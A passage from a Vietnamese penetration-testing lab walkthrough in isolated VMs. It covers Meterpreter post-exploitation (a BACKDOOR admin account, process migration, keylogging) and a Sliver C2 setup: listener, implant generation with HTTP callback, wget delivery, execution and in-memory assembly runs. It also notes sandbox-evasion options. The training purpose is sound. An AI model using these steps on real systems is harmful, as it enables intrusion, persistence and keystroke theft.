Bây giờ chúng ta hãy cùng khám phá một số lệnh để tương tác với hệ thống tập tin. Đầu tiên, chúng ta sẽ điều hướng đến thư mục `c:\`. Lưu ý rằng trong Meterpreter, bạn phải sử dụng dấu gạch chéo (`/`) để tham chiếu đến đường dẫn thư mục hoặc sử dụng chuỗi thoát của dấu gạch chéo ngược (`\`) để chỉ ra dấu gạch chéo ngược (`\\`). Vì vậy, để chuyển đến `c:\` thư mục, vui lòng chạy lệnh:

```bash
cd c:\\
```

Lưu ý rằng trong Meterpreter, bạn cũng có thể tham chiếu đến `c:\` như `/`. Vì vậy, các lệnh cd `c:\\` và `cd /` thực hiện cùng một việc.

Tiếp theo, hãy cùng tìm hiểu xem chúng ta đang ở đâu trong cấu trúc thư mục. (Vì chúng ta vừa chuyển đến `c:\`, nên chúng ta sẽ ở đó). Lệnh cụ thể phụ thuộc vào phiên bản Meterpreter bạn đang sử dụng. Đối với một số phiên bản Meterpreter, lệnh là `pwd`. Đối với các phiên bản khác, lệnh là `getcwd`. Hãy chạy một trong hai lệnh đó. Một hoặc cả hai lệnh đều có thể hoạt động:

```bash
pwd
```

![alt text](IMG/LAB2/LAB2.2/image-22.png)

Bây giờ chúng ta hãy lấy danh sách thư mục:

```bash
ls  
```

![alt text](IMG/LAB2/LAB2.2/image-23.png)

### 5. Shell

Đôi khi, những gì chúng ta muốn thực hiện trên một mục tiêu sẽ dễ dàng hơn nếu sử dụng một trình shell đơn giản của Windows, chẳng hạn như cmd.exe, hơn là sử dụng Meterpreter. Để hỗ trợ kiểu truy cập đó, Meterpreter bao gồm lệnh shell, lệnh này thực thi cmd.exe. Bạn có thể thấy tính năng tiện lợi này bằng cách thực thi lệnh shell từ bên trong dấu nhắc của Meterpreter:

```bash
shell
```

![alt text](IMG/LAB2/LAB2.2/image-24.png)

Giờ đây bạn có thể nhập bất kỳ lệnh nào bạn muốn vào cửa sổ cmd.exe.

Chạy `hostname`.

```bash
hostname
```

![alt text](IMG/LAB2/LAB2.2/image-25.png)

Chạy `ipconfig`.

```bash
ipconfig
```

![alt text](IMG/LAB2/LAB2.2/image-26.png)

Chạy `dir`:

```bash
dir
```

![alt text](IMG/LAB2/LAB2.2/image-27.png)

Bây giờ chúng ta hãy xem xét những người dùng trên hệ thống.

```bash
net user
```

![alt text](IMG/LAB2/LAB2.2/image-28.png)

Tạo một tài khoản cửa sau có tên là `BACKDOOR`.

```bash
net user BACKDOOR Password1 /add
```

![alt text](IMG/LAB2/LAB2.2/image-29.png)

Lệnh trên tạo một người dùng với mật khẩu là Password1.

Bây giờ chúng ta hãy xác nhận xem người dùng có tồn tại hay không.

```bash
net user BACKDOOR
```

![alt text](IMG/LAB2/LAB2.2/image-30.png)

Tài khoản BACKDOOR mới là một tài khoản thông thường. Sẽ hữu ích hơn nếu nó có quyền quản trị. Hãy cấp quyền quản trị cho tài khoản này.

```bash
net localgroup administrators BACKDOOR /add
```

![alt text](IMG/LAB2/LAB2.2/image-31.png)

Bây giờ, hãy xem danh sách thành viên của nhóm quản trị viên để xác nhận xem tài khoản cửa sau có phải là quản trị viên hay không.

```bash
net localgroup administrators
```

![alt text](IMG/LAB2/LAB2.2/image-32.png)

Như chúng ta thấy, tài khoản mới của chúng ta là tài khoản quản trị viên!

Hãy xóa tài khoản này.

```bash
net user BACKDOOR /del
```

![alt text](IMG/LAB2/LAB2.2/image-33.png)

Chúng ta có thể xác nhận việc xóa bằng cách chạy `net user` lại lệnh. Vì lý do tiết kiệm không gian, kết quả đầu ra không được đưa vào đây.

Để thoát khỏi cửa sổ dòng lệnh, chỉ cần gõ `exit`, và bạn sẽ quay lại dấu nhắc lệnh `meterpreter >`:

![alt text](IMG/LAB2/LAB2.2/image-34.png)

### 6. Các tính năng khác của Meterpreter

Tiếp theo, chụp ảnh màn hình hệ thống bị khai thác và lưu lại với tên `/tmp/screen.jpg`:

![alt text](IMG/LAB2/LAB2.2/image-35.png)

Meterpreter sẽ chụp ảnh màn hình, quá trình này có thể mất vài giây.

Tiếp theo, khởi chạy trình duyệt Firefox trong máy ảo Linux của bạn (bằng cách nhấp vào biểu tượng của nó trên thanh công cụ phía trên). Trong Firefox, hãy truy cập vào vị trí của:

```bash
file:///tmp/screen.jpg
```

![alt text](IMG/LAB2/LAB2.2/image-36.png)

Bây giờ chúng ta sẽ di chuyển DLL Meterpreter trên máy bị khai thác từ một tiến trình này sang tiến trình khác. Chúng ta sẽ chuyển từ tiến trình `Icecast2.exe` sang tiến trình `explorer.exe` trên máy Windows của mình. Chúng ta sử dụng Explorer vì nó sẽ tiếp tục chạy miễn là người dùng vẫn đăng nhập.

Tiếp theo, quay lại Meterpreter và lấy số ID của tiến trình hiện tại.

```bash
getpid
```

Bây giờ, hãy lấy danh sách các tiến trình để tìm ID tiến trình của Explorer. Chúng ta có thể sử dụng lệnh `ps` với tùy chọn `-S` (chữ S viết hoa) để tìm kiếm.

```bash
ps -S explorer.exe
```

![alt text](IMG/LAB2/LAB2.2/image-37.png)

Chúng ta có thể nhảy đến tiến trình explorer.exe bằng ID tiến trình, hoặc chúng ta có thể chỉ định tên bằng -Ntùy chọn.

Tiếp theo, để bắt đầu quá trình đó, chúng ta sử dụng lệnh `migrate` với số ID tiến trình đã nêu ở trên.

```bash
migrate -N explorer.exe
```

![alt text](IMG/LAB2/LAB2.2/image-38.png)

> Nếu quá trình di chuyển thất bại (nhấp để mở rộng)
> Nếu quá trình chuyển đổi của bạn thất bại (và điều này rất có thể xảy ra), bạn sẽ phải thiết lập lại phiên Meterpreter. Trước tiên, hãy tắt phiên hiện tại bằng cách gõ lệnh `exit`. Sau đó, đảm bảo Icecast đang chạy và chỉ cần gõ lại lệnh `run`.

```bash
getpid
```

Đó phải là số được liên kết với `explorer.exe`. Nếu vậy, bạn vừa chuyển đổi giữa các tiến trình. Quá trình chuyển đổi có thể gặp lỗi. Nếu tiến trình mục tiêu bị sập, điều đó không sao. Bạn có thể khai thác lại hệ thống mục tiêu bằng cách thoát khỏi phiên Meterpreter đã chết của mình bằng lệnh `CTRL-C` hoặc `exit`. Sau đó khởi động lại Icecast. Tại dấu nhắc `msf >`, chạy lại lệnh `run`.

### 7. Keystroke Logging

Khởi chạy Notepad trong máy ảo Windows của bạn (không phải thông qua Meterpreter). Trong giao diện đồ họa, nhấp vào menu Bắt đầu, gõ "notepad", sau đó khởi chạy.

Quay lại máy ảo Linux và phiên meterpreter của bạn rồi chạy lệnh đó `keyscan_start`.

![alt text](IMG/LAB2/LAB2.2/image-39.png)

Tiếp theo, trong Windows, hãy nhập một vài đoạn văn bản vào Notepad. Viết một ghi chú về mật khẩu của bạn, ví dụ như `my password is TungDvan dep trai`.

![alt text](IMG/LAB2/LAB2.2/image-40.png)

Bây giờ hãy quay lại Meterpreter và xuất các thao tác gõ phím đã thu được ra màn hình.

```bash
keyscan_dump
```

![alt text](IMG/LAB2/LAB2.2/image-41.png)

Sau đó hãy dừng phần mềm ghi lại thao tác gõ phím:

```bash
keyscan_stop
```

![alt text](IMG/LAB2/LAB2.2/image-42.png)

```bash
exit
```

Để hoàn tất bài thực hành, hãy tắt Notepad trên Windows. Sau đó, hãy dừng Icecast.

## Phần kết luận

Trong bài thực hành này, chúng ta đã thấy một lỗ hổng bảo mật phía máy chủ được khai thác nhắm vào một dịch vụ lắng nghe dễ bị tổn thương. Bằng cách khai thác lỗ hổng đó bằng Metasploit, chúng ta đã có thể tải payload Meterpreter với stager reverse_http vào bộ nhớ của máy mục tiêu. Sau đó, chúng ta đã khám phá nhiều tính năng của Meterpreter, bao gồm khả năng khám phá hệ thống tập tin, chạy các chương trình (chẳng hạn như `shell`), cung cấp các kênh liên lạc giữa Đầu vào Chuẩn và Đầu ra Chuẩn của chương trình, chụp ảnh màn hình, di chuyển các tiến trình và ghi nhật ký các thao tác gõ phím. Thực sự, Meterpreter là một thành phần payload rất mạnh mẽ trong kho vũ khí của chuyên gia kiểm thử xâm nhập.

# Lab 2.3. Sliver

## Mục tiêu

Để làm quen với Sliver và các khả năng của nó

Để thiết lập chế độ chơi nhiều người và làm quen với các tính năng của chế độ này.

Để tạo trình lắng nghe và tạo tải trọng để kết nối với trình lắng nghe.

Để sử dụng một số khả năng của thiết bị cấy ghép Sliver, cụ thể là khả năng thực thi lắp ráp.

## Thiết lập phòng thí nghiệm

Các máy ảo được sử dụng:

- Slingshot Linux

- Windows 10

Để thực hiện bài thực hành này, hãy đảm bảo bạn có thể ping từ máy ảo Slingshot Linux đến máy ảo Windows và ngược lại.

```bash
ping WINDOWS_ETHERNET0_ADDRESS
# Thay thế WINDOWS_ETHERNET0_ADDRESSbằng địa chỉ cục bộ của máy ảo Windows của bạn (KHÔNG phải địa chỉ dạng như 10.254.25X.X).
```

```bash
ping LINUX_ETH0_ADDRESS
# Thay thế LINUX_ETH0_ADDRESSbằng địa chỉ của giao diện eth0 trên máy ảo Linux của bạn (KHÔNG phải địa chỉ như 10.254.25X.Xtrên tun0).
```

## Hướng dẫn thực hành từng bước

### 1. Bắt đầu Sliver

Xóa toàn bộ dữ liệu Sliver (Vì bài LAB này CA đã cấp từ lâu nên bị hết hạn, chúng ta sẽ xóa hết đê cấp lại CA mới):

```bash
rm -rf ~/.sliver
```

Sliver gồm hai thành phần, máy khách và máy chủ. Đầu tiên, hãy khởi động máy chủ trong máy ảo Slingshot của bạn.

```bash
sudo sliver-server
```

Bạn có thể điều khiển mọi thứ từ đây, nhưng trước tiên hãy thiết lập chế độ chơi nhiều người.

Đến bước này, bạn sẽ thấy một thông báo nhắc nhở có dạng như sau:

```bash
[server] sliver >
```

Hãy xem phần trợ giúp.

```bash
help
```

```bash
[server] sliver > help

Commands:
=========
  clear       clear the screen
  exit        exit the shell
  help        use 'help [command]' for command help
  monitor     Monitor threat intel platforms for Sliver implants
  wg-config   Generate a new WireGuard client config
  wg-portfwd  List ports forwarded by the WireGuard tun interface
  wg-socks    List socks servers listening on the WireGuard tun interface


Generic:
========
  aliases           List current aliases
  armory            Automatically download and install extensions/aliases
  background        Background an active session
  beacons           Manage beacons
  builders          List external builders
  canaries          List previously generated canaries
  cursed            Chrome/electron post-exploitation tool kit (∩｀-´)⊃━☆ﾟ.*･｡ﾟ
  dns               Start a DNS listener
  env               List environment variables
  generate          Generate an implant binary
  hosts             Manage the database of hosts
  http              Start an HTTP listener
  https             Start an HTTPS listener
  implants          List implant builds
  jobs              Job control
  licenses          Open source licenses
  loot              Manage the server's loot store
  mtls              Start an mTLS listener
  prelude-operator  Manage connection to Prelude's Operator
  profiles          List existing profiles
  reaction          Manage automatic reactions to events
  regenerate        Regenerate an implant
  sessions          Session management
  settings          Manage client settings
  stage-listener    Start a stager listener
  tasks             Beacon task management
  update            Check for updates
  use               Switch the active session or beacon
  version           Display version information
  websites          Host static content (used with HTTP C2)
  wg                Start a WireGuard listener


Multiplayer:
============
  kick-operator  Kick an operator from the server
  multiplayer    Enable multiplayer mode
  new-operator   Create a new operator config file
  operators      Manage operators


For even more information, please see our wiki: https://github.com/BishopFox/sliver/wiki
```

Hầu hết các lệnh chúng ta cần xem xét đều nằm trong danh mục Chung. Danh mục Nhiều người chơi chỉ khả dụng trên máy chủ. Nó cho phép bạn cấu hình và thêm người dùng mới (người điều hành hoặc người chơi) để có thể làm việc cùng nhau như một nhóm.

Hãy cấu hình chế độ nhiều người chơi và sau đó kết nối với tư cách là máy khách. Trước tiên, chúng ta cần bật chế độ nhiều người chơi bằng cách chạy lệnh `multiplayer`.

```bash
multiplayer
```

Kết quả: 

```bash
[server] sliver > multiplayer

[*] Multiplayer mode enabled!

[server] sliver >
```

Các tùy chọn chơi nhiều người chỉ khả dụng trên máy chủ, không có trên bất kỳ máy khách nào.

Vì chúng ta đang chạy trên máy chủ, nên chúng ta có thể kết nối dễ dàng chỉ bằng cách chạy ứng dụng khách. Thay vào đó, chúng ta sẽ tạo một người dùng và kết nối bằng chứng chỉ để mô phỏng việc có nhiều người cùng sử dụng hệ thống.

Trước tiên, chúng ta cần biết các tùy chọn để tạo người chơi mới. Hãy chạy lệnh `new-operator -h` này để xem hướng dẫn.

```bash
new-operator -h
```

![alt text](IMG/LAB2/LAB2.3/image.png)

Hãy tạo một người dùng mới. Chúng ta sẽ sử dụng tên `tungdvan1`, nhưng bạn có thể sử dụng tên người dùng ưa thích của mình. Đối với địa chỉ IP, hãy sử dụng địa chỉ của giao diện tun0 (`10.254.25X.X`).

```bash
new-operator -n tungdvan1 -s /tmp/ -l 10.130.10.128
```

![alt text](IMG/LAB2/LAB2.3/image-1.png)

Mở một cửa sổ terminal mới rồi thực hiện các bước sau.

Bạn có thể chia sẻ tập tin này `cfg` với người chơi mới. Nếu muốn thử, hãy tạo một người chơi mới và chia sẻ tập tin với người kia (trong lớp học trực tuyến, bạn có thể làm điều này qua Slack). Chúng tôi khuyên bạn nên thực hiện việc này trong cuộc thi CTF cuối khóa nếu bạn đang làm việc nhóm. Trong TH này minh sẽ tạo thêm một máy ảo sec560 với địa chỉ IP là `10.130.10.129`.

Kiểm tra tệp cấu hình bằng lệnh ls -l.

```bash
ls -l /tmp/*.cfg
```

![alt text](IMG/LAB2/LAB2.3/image-2.png)

Chúng ta đã chạy máy chủ với quyền root để nó có thể lắng nghe trên cổng TCP 443. Điều này cũng có nghĩa là bất kỳ tệp nào được tạo bởi tiến trình này cũng sẽ thuộc sở hữu của root. Tệp này thậm chí còn bị hạn chế quyền truy cập hơn nữa, chỉ chủ sở hữu (root) mới có thể đọc được. Chúng ta cần thay đổi quyền truy cập của tệp để có thể đọc được nó.

```bash
sudo chown sec560:sec560 /tmp/*.cfg
```

Chúng ta hãy thực hành quy trình nhập khẩu trên hệ thống cục bộ của mình. Trước tiên, chúng ta sẽ xem xét các tùy chọn với sliver-client.

```bash
sliver-client -h
```

![alt text](IMG/LAB2/LAB2.3/image-3.png)

Nhập tệp cấu hình bằng lệnh phụ `import`.

```bash
sliver-client import /tmp/tungdvan1_10.130.10.128.cfg
```

![alt text](IMG/LAB2/LAB2.3/image-5.png)

Giờ chúng ta có thể kết nối với máy chủ. Chạy lệnh `sliver-client`.

```bash
sliver-client
```

![alt text](IMG/LAB2/LAB2.3/image-6.png)

Sau khi chọn đúng người dùng và nhấn Enter, bạn sẽ thấy lời nhắc `sliver >`. Hãy chú ý cửa sổ terminal trên máy chủ của bạn, nó sẽ hiển thị `[*] tungdvan1 has joined the game`.

![alt text](IMG/LAB2/LAB2.3/image-7.png)

### 2. Tạo Listener và Payload Implant

Chạy lệnh này trên máy khách (`sliver >`) chứ KHÔNG phải trên máy chủ (`[server] sliver >`).

Chúng ta hãy bắt đầu bằng cách tạo một trình lắng nghe https.

```bash
https -h
```

![alt text](IMG/LAB2/LAB2.3/image-8.png)

Trong thực tế, chúng ta sẽ thiết lập chứng chỉ (hoặc chứng chỉ Let's Encrypt) và tạo tên miền. Hiện tại, chúng ta chỉ sử dụng địa chỉ IP.

Chúng ta hãy bắt đầu với một trình lắng nghe https đơn giản.

```bash
https
```

![alt text](IMG/LAB2/LAB2.3/image-9.png)

Hãy để ý rằng nó đã nói như vậy `job #2`. Chúng ta hãy cùng xem xét các công việc.

```bash
jobs
```

![alt text](IMG/LAB2/LAB2.3/image-10.png)

Công việc đầu tiên chạy trên cổng 31337 là dành cho người dùng từ xa (multiplayer). Chúng tôi cũng có trình lắng nghe https đang chạy trên cổng mặc định 443.

Giờ chúng ta đã cấu hình xong trình lắng nghe để nhận kết nối. Hãy cùng xem cách xây dựng dữ liệu gửi đi.

```bash
generate -h
```

```bash
Command: generate <options>
About: Generate a new sliver binary and saves the output to the cwd or a path specified with --save.

++ Command and Control ++
You must specificy at least one c2 endpoint when generating an implant, this can be one or more of --mtls, --wg, --http, or --dns, --named-pipe, or --tcp-pivot.
The command requires at least one use of --mtls, --wg, --http, or --dns, --named-pipe, or --tcp-pivot.

The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using mutual-TLS:
        generate --mtls foo.example.com

The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using Wireguard on UDP port 9090,
then connect to TCP port 1337 on the server's virtual tunnel interface to retrieve new wireguard keys, re-establish the wireguard connection using the new keys,
then connect to TCP port 8888 on the server's virtual tunnel interface to establish c2 comms.
        generate --wg 3.3.3.3:9090 --key-exchange 1337 --tcp-comms 8888

You can also stack the C2 configuration with multiple protocols:
        generate --os linux --mtls example.com,domain.com --http bar1.evil.com,bar2.attacker.com --dns baz.bishopfox.com


++ Formats ++
Supported output formats are Windows PE, Windows DLL, Windows Shellcode, Mach-O, and ELF. The output format is controlled
with the --os and --format flags.

To output a 64bit Windows PE file (defaults to WinPE/64bit), either of the following command would be used:
        generate --mtls foo.example.com
        generate --os windows --arch 64bit --mtls foo.example.com

A Windows DLL can be generated with the following command:
        generate --format shared --mtls foo.example.com

To output a MacOS Mach-O executable file, the following command would be used
        generate --os mac --mtls foo.example.com

To output a Linux ELF executable file, the following command would be used:
        generate --os linux --mtls foo.example.com


++ DNS Canaries ++
DNS canaries are unique per-binary domains that are deliberately NOT obfuscated during the compilation process.
This is done so that these unique domains show up if someone runs 'strings' on the binary, if they then attempt
to probe the endpoint or otherwise resolve the domain you'll be alerted that your implant has been discovered,
and which implant file was discovered along with any affected sessions.

Important: You must have a DNS listener/server running to detect the DNS queries (see the "dns" command).

Unique canary subdomains are automatically generated and inserted using the --canary flag. You can view previously generated
canaries and their status using the "canaries" command:
        generate --mtls foo.example.com --canary 1.foobar.com

++ Execution Limits ++
Execution limits can be used to restrict the execution of a Sliver implant to machines with specific configurations.

++ Profiles ++
Due to the large number of options and C2s this can be a lot of typing. If you'd like to have a reusable a Sliver config
see 'help profiles new'. All "generate" flags can be saved into a profile, you can view existing profiles with the "profiles"
command.


Usage:
======
  generate [flags]

Flags:
======
  -a, --arch               string    cpu architecture (default: amd64)
  -c, --canary             string    canary domain(s)
  -d, --debug                        enable debug features
  -O, --debug-file         string    path to debug output
  -G, --disable-sgn                  disable shikata ga nai shellcode encoder
  -n, --dns                string    dns connection strings
  -e, --evasion                      enable evasion features (e.g. overwrite user space hooks)
  -E, --external-builder             use an external builder
  -f, --format             string    Specifies the output formats, valid values are: 'exe', 'shared' (for dynamic libraries), 'service' (see `psexec` for more info) and 'shellcode' (windows only) (default: exe)
  -h, --help                         display help
  -b, --http               string    http(s) connection strings
  -X, --key-exchange       int       wg key-exchange port (default: 1337)
  -w, --limit-datetime     string    limit execution to before datetime
  -x, --limit-domainjoined           limit execution to domain joined machines
  -F, --limit-fileexists   string    limit execution to hosts with this file in the filesystem
  -z, --limit-hostname     string    limit execution to specified hostname
  -L, --limit-locale       string    limit execution to hosts that match this locale
  -y, --limit-username     string    limit execution to specified username
  -k, --max-errors         int       max number of connection errors (default: 1000)
  -m, --mtls               string    mtls connection strings
  -N, --name               string    agent name
  -p, --named-pipe         string    named-pipe connection strings
  -o, --os                 string    operating system (default: windows)
  -P, --poll-timeout       int       long poll request timeout (default: 360)
  -j, --reconnect          int       attempt to reconnect every n second(s) (default: 60)
  -R, --run-at-load                  run the implant entrypoint from DllMain/Constructor (shared library only)
  -s, --save               string    directory/file to the binary to
  -l, --skip-symbols                 skip symbol obfuscation
  -Z, --strategy           string    specify a connection strategy (r = random, rd = random domain, s = sequential)
  -T, --tcp-comms          int       wg c2 comms port (default: 8888)
  -i, --tcp-pivot          string    tcp-pivot connection strings
  -I, --template           string    implant code template (default: sliver)
  -t, --timeout            int       command timeout in seconds (default: 60)
  -g, --wg                 string    wg connection strings

Sub Commands:
=============
  beacon  Generate a beacon binary
  info    Get information about the server's compiler
  stager  Generate a stager using Metasploit (requires local Metasploit installation)
```

Có một vài biện pháp bảo vệ thú vị mà chúng ta có thể sử dụng để cố gắng vượt qua công nghệ hộp cát. Hãy cùng xem xét một vài trong số đó:

- `-w, --limit-datetime`: giới hạn việc thực thi trước thời điểm datetime (tương tự như KillDate trong Empire).

- `-x, --limit-domainjoined`: giới hạn việc thực thi chỉ trên các máy đã tham gia miền.

- `-F, --limit-fileexists`: giới hạn việc thực thi chỉ trên các máy chủ có tệp này trong hệ thống tệp

- `-z, --limit-hostname`: giới hạn việc thực thi chỉ trên tên máy chủ được chỉ định

- `-y, --limit-username`: giới hạn quyền thực thi cho người dùng được chỉ định

Chúng ta sẽ không sử dụng các tùy chọn này, nhưng `-x`, `--limit-domainjoined` là một lựa chọn tốt để vượt qua các biện pháp phòng thủ sandbox đơn giản.

Chúng ta cũng có thể chỉ định một miền "canary" (`-c`, `--canary`). Miền canary được bao gồm trong tệp thực thi, nhưng không được sử dụng cho máy chủ điều khiển (C2). Nó được bao gồm để nếu mục tiêu truy vấn miền đó, bạn có thể biết được rằng ai đó đang nghiên cứu miền đó. Chúng ta sẽ bỏ qua tính năng đó vào lúc này.

Sliver thực hiện mã hóa và làm mờ dữ liệu rất phức tạp. Đây là một tính năng tuyệt vời, nhưng việc tạo ra dữ liệu có thể mất khá nhiều thời gian. Để tăng tốc quá trình thực hành, chúng tôi thường sử dụng `--skip-symbols` để bỏ qua bước này. Tuy nhiên, trong thực tế, bạn sẽ không muốn sử dụng tùy chọn này.

Hãy xây dựng một payload dành cho Windows để kết nối trở lại với listener của chúng ta. Chúng ta cần chỉ định listener và hệ điều hành.

Lệnh này có thể mất đến một phút để tạo ra dữ liệu.

```bash
generate --os windows --skip-symbols --name first2 --http 10.130.10.128
# Thay thế LINUX_ETH0_ADDRESS bằng địa chỉ của giao diện eth0 trên máy ảo Linux của bạn.
# Địa chỉ máy Server
```

![alt text](IMG/LAB2/LAB2.3/image-11.png)

![alt text](IMG/LAB2/LAB2.3/image-12.png)

Chuyển tệp sang `/home/sec560/`:

```bash
sudo cp /tmp/first2.exe /home/sec560/
```

Hãy cùng xem xét thiết bị cấy ghép mà chúng ta vừa tạo ra.

```bash
implants
```

![alt text](IMG/LAB2/LAB2.3/image-16.png)

### 3. Gửi Payload đến hệ thống Windows

Mở một cửa sổ terminal mới để chúng ta có thể tạo một máy chủ gửi dữ liệu đến hệ thống Windows của mình.

Hãy sử dụng Python để phục vụ tập tin này.

```bash
python3 -m http.server
```

![alt text](IMG/LAB2/LAB2.3/image-14.png)

Chuyển sang máy chủ Windows của bạn và mở PowerShell. Di chuyển đến màn hình nền và tải xuống tệp.

```bash
cd Desktop
wget http://10.130.10.129:8000/first2.exe -OutFile first.exe
```

Trong PowerShell, hãy xác nhận xem tệp đã được sao chép thành công hay chưa.

```bash
ls first2.exe
```

![alt text](IMG/LAB2/LAB2.3/image-15.png)

Tệp tin này có dung lượng khoảng 9MB.

### 4. Thực thi Payload

Trên hệ thống Windows của bạn, hãy nhấp đúp first.exevào màn hình Desktop.

Trên máy chủ Sliver của bạn, bạn sẽ thấy một kết nối được thiết lập.

![alt text](IMG/LAB2/LAB2.3/image-17.png)

Hãy xem phiên làm việc với `sessions`.

```bash
sessions
```

![alt text](IMG/LAB2/LAB2.3/image-18.png)

Hãy tương tác với phiên bằng cách sử dụng usevà hai ký tự đầu tiên của ID phiên. Trong ví dụ này là 79, nhưng ID của bạn sẽ khác.

```bash
use 79
```

![alt text](IMG/LAB2/LAB2.3/image-19.png)

Chúng ta đang trong phiên làm việc.

### 5. Tương tác với Session

Hãy cùng xem các tùy chọn có sẵn trong phiên làm việc của chúng ta bằng cách chạy lệnh này help.

```bash
help
```

```bash
[server] sliver (first2) > help

Commands:
=========
  clear       clear the screen
  exit        exit the shell
  help        use 'help [command]' for command help
  monitor     Monitor threat intel platforms for Sliver implants
  wg-config   Generate a new WireGuard client config
  wg-portfwd  List ports forwarded by the WireGuard tun interface
  wg-socks    List socks servers listening on the WireGuard tun interface


Generic:
========
  aliases           List current aliases
  armory            Automatically download and install extensions/aliases
  background        Background an active session
  beacons           Manage beacons
  builders          List external builders
  canaries          List previously generated canaries
  cursed            Chrome/electron post-exploitation tool kit (∩｀-´)⊃━☆ﾟ.*･｡ﾟ
  dns               Start a DNS listener
  env               List environment variables
  generate          Generate an implant binary
  hosts             Manage the database of hosts
  http              Start an HTTP listener
  https             Start an HTTPS listener
  implants          List implant builds
  jobs              Job control
  licenses          Open source licenses
  loot              Manage the server's loot store
  mtls              Start an mTLS listener
  prelude-operator  Manage connection to Prelude's Operator
  profiles          List existing profiles
  reaction          Manage automatic reactions to events
  regenerate        Regenerate an implant
  sessions          Session management
  settings          Manage client settings
  stage-listener    Start a stager listener
  tasks             Beacon task management
  update            Check for updates
  use               Switch the active session or beacon
  version           Display version information
  websites          Host static content (used with HTTP C2)
  wg                Start a WireGuard listener


Multiplayer:
============
  kick-operator  Kick an operator from the server
  multiplayer    Enable multiplayer mode
  new-operator   Create a new operator config file
  operators      Manage operators


Sliver - Windows:
=================
  backdoor          Infect a remote file with a sliver shellcode
  dllhijack         Plant a DLL for a hijack scenario
  execute-assembly  Loads and executes a .NET assembly in a child process (Windows Only)
  getprivs          Get current privileges (Windows only)
  getsystem         Spawns a new sliver session as the NT AUTHORITY\SYSTEM user (Windows Only)
  impersonate       Impersonate a logged in user.
  make-token        Create a new Logon Session with the specified credentials
  migrate           Migrate into a remote process
  psexec            Start a sliver service on a remote target
  registry          Windows registry operations
  rev2self          Revert to self: lose stolen Windows token
  runas             Run a new process in the context of the designated user (Windows Only)
  spawndll          Load and execute a Reflective DLL in a remote process


Sliver:
=======
  cat                Dump file to stdout
  cd                 Change directory
  chmod              Change permissions on a file or directory
  chown              Change owner on a file or directory
  chtimes            Change access and modification times on a file (timestomp)
  close              Close an interactive session without killing the remote process
  download           Download a file
  execute            Execute a program on the remote system
  execute-shellcode  Executes the given shellcode in the sliver process
  extensions         Manage extensions
  getgid             Get session process GID
  getpid             Get session pid
  getuid             Get session process UID
  ifconfig           View network interface configurations
  info               Get info about session
  interactive        Task a beacon to open an interactive session (Beacon only)
  kill               Kill a session
  ls                 List current directory
  mkdir              Make a directory
  msf                Execute an MSF payload in the current process
  msf-inject         Inject an MSF payload into a process
  mv                 Move or rename a file
  netstat            Print network connection information
  ping               Send round trip message to implant (does not use ICMP)
  pivots             List pivots for active session
  portfwd            In-band TCP port forwarding
  procdump           Dump process memory
  ps                 List remote processes
  pwd                Print working directory
  reconfig           Reconfigure the active beacon/session
  rename             Rename the active beacon/session
  rm                 Remove a file or directory
  rportfwd           reverse port forwardings
  screenshot         Take a screenshot
  shell              Start an interactive shell
  shikata-ga-nai     Polymorphic binary shellcode encoder (ノ ゜Д゜)ノ ︵ 仕方がない
  sideload           Load and execute a shared object (shared library/DLL) in a remote process
  socks5             In-band SOCKS5 Proxy
  ssh                Run a SSH command on a remote host
  terminate          Terminate a process on the remote system
  upload             Upload a file
  whoami             Get session user execution context


For even more information, please see our wiki: https://github.com/BishopFox/sliver/wiki
```

Các lệnh thú vị nhất sẽ nằm trong các danh mục `Sliver - Windows` và `Sliver`.

Trước tiên, hãy tìm hiểu một số thông tin về hệ thống bị xâm nhập.

```bash
getuid
getgid
```

![alt text](IMG/LAB2/LAB2.3/image-20.png)

Các lệnh `getuid` và `getgid` trả về SID của người dùng và nhóm tương ứng. Thông tin này không thực sự hữu ích. Lệnh `whoami` tốt hơn nhiều.

![alt text](IMG/LAB2/LAB2.3/image-21.png)

Nếu bạn muốn có tất cả thông tin này (và nhiều hơn nữa) chỉ với một lệnh duy nhất, hãy chạy lệnh `info`.

```bash
info
```

![alt text](IMG/LAB2/LAB2.3/image-22.png)

Ở đây chúng ta thấy thông tin về người dùng hiện tại và chi tiết về máy chủ.

### 6. Shell

Tương tự như Metasploit, chúng ta có thể truy cập vào giao diện dòng lệnh bằng lệnh `shell` này.

```bash
shell
```

![alt text](IMG/LAB2/LAB2.3/image-23.png)

> Khi chạy chương trình, shellbạn sẽ nhận được thông báo rằng đây là hành vi xâm phạm an ninh mạng (OPSEC) nghiêm trọng. Các công cụ phòng thủ được tinh chỉnh để tìm kiếm các tiến trình tạo ra các công cụ thường được các tác nhân độc hại sử dụng, chẳng hạn như CMD và PowerShell.

Như bạn thấy, giờ chúng ta đã có một cửa sổ nhắc lệnh PowerShell tương tác. Chúng ta có thể chạy bất kỳ lệnh PowerShell nào. Chạy lệnh `ls c:\` để xem thư mục gốc của ổ đĩa.

```bash
ls c:\
```

![alt text](IMG/LAB2/LAB2.3/image-24.png)

Thoát khỏi cửa sổ dòng lệnh này bằng cách gõ `exit`. Chúng ta sẽ thử một số công cụ khác để tìm hiểu về các hệ thống khác.

![alt text](IMG/LAB2/LAB2.3/image-25.png)

### 7. Thực thi Assembly - SharpWMI

Chúng ta sẽ sử dụng một assembly khác như vậy ở cuối phần 2, `Seatbelt! GhostPack` cũng bao gồm các assembly khác. Chúng ta sẽ sử dụng SharpWMI. Để làm điều này, chúng ta cần sử dụng lệnh execute-assemblyvà cung cấp đường dẫn đến SharpWMI.exe trên hệ thống Linux của mình.

```bash
execute-assembly /home/sec560/labs/SharpWMI.exe
```

![alt text](IMG/LAB2/LAB2.3/image-26.png)

Bạn nên xem phần trợ giúp của SharpWMI.

Sliver đã chuyển tập tin và thực thi nó trong bộ nhớ. Vì tập tin không bao giờ được ghi vào ổ đĩa, nên các công cụ phòng thủ sẽ khó phát hiện việc thực thi hơn.

Hãy thử nghiệm bằng cách chạy thao tác `loggedon` để lấy danh sách người dùng đã đăng nhập.

![alt text](IMG/LAB2/LAB2.3/image-27.png)

> Bạn phải nhập đúng kiểu chữ hoa chữ thường như trên. Linux có hệ thống tập tin phân biệt chữ hoa chữ thường (không giống như Windows).

Chúng ta có thể thấy `SEC560STUDENT\sec560` người dùng cục bộ trên máy ảo Windows của mình. Chúng ta cũng có thể sử dụng điều này để nhắm mục tiêu vào các hệ thống khác. Chúng ta sẽ làm điều này sau trong một bài thực hành về chuyển hướng tấn công!

